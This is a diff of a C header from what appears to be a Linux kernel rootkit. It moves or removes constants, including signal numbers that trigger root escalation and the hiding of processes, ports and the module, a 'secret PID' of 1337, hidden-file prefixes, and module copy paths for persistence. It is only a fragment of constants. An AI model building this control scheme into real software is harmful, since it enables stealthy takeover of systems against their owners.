@@ -1,6 +1,7 @@
 #ifndef _ROOTKIT_CONSTANTS_H_
 #define _ROOTKIT_CONSTANTS_H_
 
+#include "uapi/rootkit.h"
 #include <linux/types.h>
 #include <vdso/limits.h>
 
@@ -23,20 +24,8 @@ extern const string_t S_HIDDEN_PREFIXES[]; // Prefixes for hidden files/director
 #define MOD_FILE "/root/%s.ko"            /* Module file in /root/ */
 #define MOD_COPY "/lib/modules/%s_mod.ko" /* Module file in /lib/modules/ (copied) */
 
-#define SIGROOT     42 /* Elevate the current process to root */
-#define SIGHIDE     43 /* Hide the process with the given PID */
-#define SIGSHOW     44 /* Show the process with the given PID */
-#define SIGAUTH     45 /* Authorize the process with the given PID */
-#define SIGMODHIDE  46 /* Hide the rootkit */
-#define SIGMODSHOW  47 /* Show the rootkit */
-#define SIGPORTHIDE 48 /* Add a port to the hidden ports list */
-#define SIGPORTSHOW 49 /* Remove a port from the hidden ports list */
-
-#define PID_SELF (pid_t)0        /* PID of the current process */
-#define PID_ANY  (pid_t) INT_MIN /* Any PID */
-#define SIG_ANY  INT_MIN         /* Any signal */
-
-#define PID_SECRET (pid_t)1337 /* Secret PID that has to be used when sending some signals */
+#define PID_ANY (pid_t) INT_MIN /* Any PID */
+#define SIG_ANY INT_MIN         /* Any signal */
 
 #define ROOT_UID (uid_t)0 /* The root user ID */
 #define ROOT_GID (gid_t)0 /* The root group ID */
